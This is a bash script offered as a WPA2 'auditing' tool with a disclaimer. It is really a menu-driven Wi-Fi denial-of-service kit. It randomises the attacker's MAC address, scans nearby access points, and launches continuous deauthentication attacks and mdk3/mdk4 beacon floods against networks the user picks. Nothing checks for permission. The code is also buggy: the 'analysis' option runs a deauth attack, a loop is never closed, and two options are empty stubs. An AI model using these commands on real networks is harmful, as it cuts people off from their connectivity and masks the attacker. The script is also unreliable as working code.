#!/bin/bash

#this script is for educational purposes only
#I am not responsible for any damage caused by its use
#this script is for testing your own network or someone else's network *WITH PERMISSION*

#this script is for auditing WPA2 APs
#by: TDonk994

#last commit date: 11/20/2024




echo "DOS Attack for WPA2 APS, using airodump, airmon, mdk3 and mdk4"
sleep 1
echo "make sure you have sudo privileges"
echo "make sure you have a wireless adapter able to go into monitor mode"
echo "recommend to use in dir desktop"
read -p "Do you want to continue? (y/n): " continue
if [ $continue == "n" ]; then
    echo "exiting"
    exit 1
else
    echo "continuing"
fi
sleep 1
echo "Checking if mdk3, mdk4 and aircrack-ng are installed"
#this variables check if the packages are installed
mdk3Check=$(sudo dpkg -s mdk3 &> /dev/null && echo "true" || echo "false")
mdk4Check=$(sudo dpkg -s mdk4 &> /dev/null && echo "true" || echo "false")
aircrackCheck=$(sudo dpkg -s aircrack-ng &> /dev/null && echo "true" || echo "false")
#this checks if mdk3 is installed
if [ $mdk3Check == "false" ]; then
    echo "mdk3 is not installed"
    read -p "Do you want to install mdk3? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing mdk3"
        sudo apt-get install mdk3
        echo "mdk3 installed"
    else
        echo "mdk3 is required for this attack"
        exit 1
    fi
else
    echo "mdk3 is installed"
fi
#this checks if mdk4 is installed
if [ $mdk4Check == "false" ]; then
    echo "mdk4 is not installed"
    read -p "Do you want to install mdk4? (y/n): " install
    if [ $install == "y" ]
    then
        echo "installing mdk4"
        sudo apt-get install mdk4
        echo "mdk4 installed"
    else
        echo "mdk4 is required for this attack"
        exit 1
    fi
else
    echo "mdk4 is installed"
fi
#this checks if aircrack-ng is installed
if [ $aircrackCheck == "false" ]; then
    echo "aircrack-ng is not installed"
    read -p "Do you want to install aircrack-ng? (y/n): " install
    if [ $install == "y" ]; then
        echo "installing aircrack-ng"
        sudo apt-get install aircrack-ng
        echo "aircrack-ng installed"
    else
        echo "aircrack-ng is required for this attack"
        exit 1
    fi
else
    echo "aircrack-ng is installed"
fi
sleep 1
#setting up the wireless adapter and other stuff that might interfere with the attack
echo "setting up the wireless adapter/interfaces"
sudo ifconfig eth0 down 
sudo ifconfig wlan0 down 
sudo macchanger wlan0 
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo iwconfig wlan0 up
Clears_CSV() {
    if [ -e "wlan0-01.csv" ]; then
        sudo rm wlan0-01.csv
        echo "removed wlan0-01.csv"
    else
        echo "no more wlan0-01.csv"
    fi
    if [ -e "bssid.csv" ]; then
        sudo rm bssid.csv
        echo "removed bssid.csv"
    else
        echo "no more bssid.csv"
    fi
    if [ -e "bssid1.csv" ]; then
        sudo rm bssid1.csv
        echo "removed bssid1.csv"
    else
        echo "no more bssid1.csv"
    fi
    if [ -e "bssid2.csv" ]; then
        sudo rm bssid2.csv
        echo "removed bssid2.csv"
    else
        echo "no  more bssid2.csv"
    fi
    echo "all files deleted or non existent"
    sleep 1
}
For_aireplay () {
    echo "setting up aireplay-ng deauth attack"
    #deletes the files if they exist so no duplicates
    #also recommend to use the desktop directory for this
    Clears_CSV
    sleep 1
    echo "starting airodump-ng to find APs, this will take 30 seconds"
    sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
    sleep 32
    cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
    cat bssid1.csv | awk '{print $1}' > bssid.csv
    cat bssid1.csv | awk '{print $6}' > bssid.csv   
    cat bssid1.csv | awk '{print $10}' > bssid.csv
    cat bssid.csv | awk '{print}'
    read -p "which AP?: " AP
    echo "you chose $AP"
    cat bssid.csv | grep $AP > bssid2.csv
    usedbssid=$(cat bssid2.csv | awk '{print $1}')
    channelused=$(cat bssid2.csv | awk '{print $2}')
    echo "changing channel to $channelused"
    sudo iwconfig wlan0 channel $channelused
    echo "starting aireplay-ng deauth attack"
    sudo aireplay-ng -0 0 -a $usedbssid wlan0
}


For_mdk3 () {
    echo "you chose to use randon SSID beacon flood"
    while true; do
        read -p "which channel do you want to flood?: " channel
        if [[ -n ${channel//[0-9]/} ]]; then
            echo "invalid input"
        else
            echo "you chose channel $channel"
            echo "starting mdk3 channel becon flood"
            echo "cancel the attack with ctrl c"
            sudo mdk3 wlan0 b -c $channel
            break
        fi
        
    done
}


For_mdk4 () {
    echo "you chose to choose a fake SSID beacon flood"
    read -p "which SSID/name do you want to use?: " SSID
    echo "your fake AP is $SSID"
    while true; do
    read -p "which channel do you want to use?: " channel
        if [[ -n ${channel//[0-9]/} ]]; then
        echo "invalid input"
        else 
            echo "chosen channel is $channel"
            echo "starting mdk4 fake SSID beacon flood"
            echo "cancel the attack with ctrl c"
            sudo mdk4 wlan0 b -n $SSID -c $channel
            break
        fi
    done
}

For_Analysis () {
    echo "you chose nearby AP analysis"
    echo "removing existing csv files"
    if [ -e "wlan0-01.csv" ]; then
        sudo rm wlan0-01.csv
        echo "removed wlan0-01.csv"
    else
        echo "no more wlan0-01.csv"
    fi
    if [ -e "bssid.csv" ]; then
        sudo rm bssid.csv
        echo "removed bssid.csv"
    else
        echo "no more bssid.csv"
    fi
    if [ -e "bssid1.csv" ]; then
        sudo rm bssid1.csv
        echo "removed bssid1.csv"
    else
        echo "no more bssid1.csv"
    fi
    if [ -e "bssid2.csv" ]; then
        sudo rm bssid2.csv
        echo "removed bssid2.csv"
    else
        echo "no  more bssid2.csv"
    fi
    echo "all files deleted or non existent"
    sleep 1
    echo "starting airodump-ng to find APs, this will take 30 seconds"
    sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
    sleep 32
    cat wlan0-01.csv | sed 's/,//g' > bssid1.csv
    cat bssid1.csv | awk '{print $1}' > bssid.csv
    cat bssid1.csv | awk '{print $6}' > bssid.csv
    cat bssid1.csv | awk '{print $10}' > bssid.csv
    cat bssid.csv | awk '{print}'
    read -p "which AP?: " AP
    echo "you chose $AP"
    cat bssid.csv | grep $AP > bssid2.csv
    usedbssid=$(cat bssid2.csv | awk '{print $1}')
    channelused=$(cat bssid2.csv | awk '{print $2}')
    echo "changing channel to $channelused"
    sudo iwconfig wlan0 channel $channelused
    echo "starting aireplay-ng deauth attack"
    sudo aireplay-ng -0 0 -a $usedbssid wlan0
}

For_Auth_Flood () {
    echo "you chose Auth Flood"
    sleep 1
    echo "this auth flood will use mkd4"
    Clears_CSV
    sleep 1
    echo "would you like to scan for APs or do you already know its MAC address?"
    while true; do
        read -p "1) Scan for APs\n2) Already know MAC address\n3) Exit: " choice
        if [ $choice == 1 ]; then
            echo "starting airodump-ng to find APs, this will take 30 seconds"
            sudo timeout 30 airodump-ng -b abg wlan0 --write wlan0 --output-format csv
            sleep 32
            cat wlan0-01.csv | sed 's/,//g' > bssid.csv
            cat bssid.csv | awk '{print $1}' > bssid1.csv
            cat bssid.csv | awk '{print $6}' > bssid1.csv
            cat bssid.csv | awk '{print $10}' > bssid1.csv
            cat bssid1.csv | awk '{print}'
            read -p "which AP?: " AP
            echo "you chose $AP"
            # now confirm the AP exists

            cat bssid1.csv | grep $AP > bssid2.csv
            usedbssid=$(cat bssid2.csv | awk '{print $1}')
            channelused=$(cat bssid2.csv | awk '{print $2}')
            echo "changing channel to $channelused"
            sudo iwconfig wlan0 channel $channelused
            echo "starting aireplay-ng deauth attack"
            sudo aireplay-ng -0 0 -a $usedbssid wlan0
            break
        elif [ $choice == 2 ]; then
            read -p "Enter the AP's MAC address: " AP
            echo "you chose $AP"
            read -p "Enter the AP's channel: " channel
            echo "you chose channel $channel"
            echo "changing channel to $channel"
            sudo iwconfig wlan0 channel $channel
            echo "starting aireplay-ng deauth attack"
            sudo aireplay-ng -0 0 -a $AP wlan0
            break
        elif [ $choice == 3 ]; then
            echo "exiting"
            exit 1
        else
            echo "invalid input"
        fi

}

For_WPA2_Crack () {
    echo "you chose WPA2 Crack"
    
}

For_Layer1_Deauth () {
    echo "you chose Layer 1 Deauth"
    
}

while true; do
    echo -e "Which do you want to use?\n1) Layer 2 Deauth\n2) Random SSID beacon flood\n3) Chosen fake SSID beacon flood\n4) Nearby AP analysis\n5) Auth Flood\n6) Layer 1 Deauth\n7) WPA2 Crack\n8) Exit"
    sleep 1
    read -p "what's your choice: " attack 
    if [ $attack == 1 ]; then
        For_aireplay
    elif [ $attack == 2 ]; then
        For_mdk3
    elif [ $attack == 3 ]; then
        For_mdk4
    elif [ $attack == 4 ]; then
        For_Analysis
    elif [ $attack == 5 ]; then
        For_Auth_Flood
    elif [ $attack == 6 ]; then
        For_Layer1_Deauth
    elif [ $attack == 7 ]; then
        For_WPA2_Crack
    elif [ $attack == 8 ]; then
        echo "exiting"
        exit 1
    else
        echo "invalid input, try again"
    fi
done





#asking the user which attack they want to use
